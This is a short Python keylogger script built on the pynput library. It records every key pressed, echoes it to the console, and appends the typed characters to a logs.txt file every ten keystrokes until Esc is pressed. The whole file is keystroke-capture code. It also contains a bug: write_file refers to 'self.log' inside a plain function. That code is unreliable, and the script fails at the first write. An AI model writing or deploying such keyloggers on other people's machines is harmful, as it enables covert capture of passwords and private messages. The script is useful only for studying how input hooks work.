import pynput #downloaded through cmd, using pip

from pynput.keyboard import Key, Listener

count = 0
keys = [] #list for keys pressed 

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file()
        keys = []



def write_file():
    with open("logs.txt", "a") as f:
        print(self.log, file=f)
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()    
